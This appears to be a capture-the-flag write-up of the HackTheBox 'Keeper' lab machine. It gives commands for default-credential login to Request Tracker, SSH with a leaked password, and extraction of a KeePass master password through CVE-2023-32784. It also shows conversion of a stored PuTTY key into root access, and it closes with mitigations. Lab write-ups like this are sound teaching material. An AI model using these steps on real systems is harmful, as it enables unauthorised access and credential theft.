---
title: "Keeper - HackTheBox"
description: "Writeup of the Keeper machine from HackTheBox, an easy Linux machine involving Request Tracker exploitation and KeePass credential extraction."
pubDate: 2024-11-02
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
language: en
tags: ["request-tracker", "keepass", "CVE-2023-32784", "putty", "ppk"]
retired: false
logo: "/images/writeups/htb/keeper/logo.png"
heroImage: "/images/writeups/htb/keeper/card.png"
attackVectors: ["web"]
techniques: ["T1190", "T1555.003", "T1552.001"]
vulnerabilities: ["CVE-2023-32784", "default-credentials"]
certifications: ["OSCP", "eJPT"]
skillLevel: "beginner"
estimatedTime: "1-2 hours"
points: 20
rating: 4.2
---

# Keeper - HackTheBox Writeup

**Difficulty**: Easy  
**OS**: Linux  
**Platform**: HackTheBox  
**IP**: 10.10.11.227

## Introduction

Keeper is an easy Linux machine featuring a Request Tracker (RT) system with default credentials. After gaining initial access, we'll find a KeePass file vulnerable to CVE-2023-32784, allowing us to extract credentials and obtain root access via an SSH private key in PuTTY format.

## Reconnaissance

### Port Scanning

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.227 -oG allPorts
```

**Open ports:**
- 22/tcp - SSH
- 80/tcp - HTTP

### Service Scanning

```bash
nmap -p22,80 -sCV 10.10.11.227 -oN targeted
```

**Results:**
- **22/tcp** - OpenSSH 8.9p1 Ubuntu
- **80/tcp** - nginx 1.18.0

## Web Enumeration

### Website Access

When accessing `http://10.10.11.227`, we're redirected to `http://tickets.keeper.htb/rt/`.

Add to `/etc/hosts`:

```bash
echo "10.10.11.227 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts
```

### Request Tracker

The site runs **Request Tracker (RT)**, a ticket management system.

## Exploitation

### Default Credentials

We try the default Request Tracker credentials:
- Username: `root`
- Password: `password`

Success! We gain access to the admin panel.

### User Enumeration

Browsing the panel, we find information about user **lnorgaard**:

- **Username**: lnorgaard
- **Email**: lnorgaard@keeper.htb
- **Comment**: "Initial password: Welcome2023!"

### SSH as lnorgaard

```bash
ssh lnorgaard@10.10.11.227
# Password: Welcome2023!
```

**User flag:**
```bash
cat /home/lnorgaard/user.txt
```

## Post-Exploitation

### Home Directory Enumeration

```bash
ls -la /home/lnorgaard
```

We find two interesting files:
- `RT30000.zip`
- `user.txt`

### Download ZIP File

```bash
# On victim machine
python3 -m http.server 8000

# On our machine
wget http://10.10.11.227:8000/RT30000.zip
```

### ZIP File Analysis

```bash
unzip RT30000.zip
```

**Contents:**
- `KeePassDumpFull.dmp` - KeePass memory dump
- `passcodes.kdbx` - KeePass database

## Privilege Escalation

### CVE-2023-32784 - KeePass Master Password Dump

KeePass is vulnerable to **CVE-2023-32784**, which allows extracting the master password from a memory dump.

### Exploitation Tool

```bash
git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper
dotnet run KeePassDumpFull.dmp
```

**Partial result:**
```
Password: ●{d, M}g{r, M}ø{d, M}, {m, M}e{d, M} {f, M}l{ø, M}d{e, M}...
```

The password appears to be Danish. Searching Google for "rødgrød med fløde" (a traditional Danish dessert).

**Master password:** rødgrød med fløde

### Opening KeePass Database

```bash
kpcli --kdb=passcodes.kdbx
# Master password: rødgrød med fløde
```

or using KeePassXC:

```bash
keepassxc passcodes.kdbx
```

### Root Credentials

Inside KeePass we find an entry for `root`:

- **Username**: root
- **Password**: (not relevant)
- **Notes**: Contains a PuTTY private key (PPK)

### PPK to OpenSSH Key Conversion

Save the PPK key to a file `root.ppk` and convert it:

```bash
puttygen root.ppk -O private-openssh -o root_key
chmod 600 root_key
```

### SSH as root

```bash
ssh -i root_key root@10.10.11.227
```

**Root flag:**
```bash
cat /root/root.txt
```

## Conclusion

Keeper is an excellent machine to learn about:
- Exploiting default credentials in enterprise applications
- Ticket system analysis (Request Tracker)
- CVE-2023-32784 - KeePass master password extraction
- Memory dump analysis
- Converting PuTTY keys to OpenSSH format
- Credential management and storage risks

**Lessons Learned:**
- Always change default credentials in production systems
- Password managers can also be vulnerable
- Memory dumps can reveal sensitive information
- Complete application enumeration can reveal critical information

**Mitigations:**
- Change default credentials immediately
- Update KeePass to patched versions (2.54+)
- Don't store private keys in password managers without additional encryption
- Implement multi-factor authentication
- Monitor access and changes in critical systems
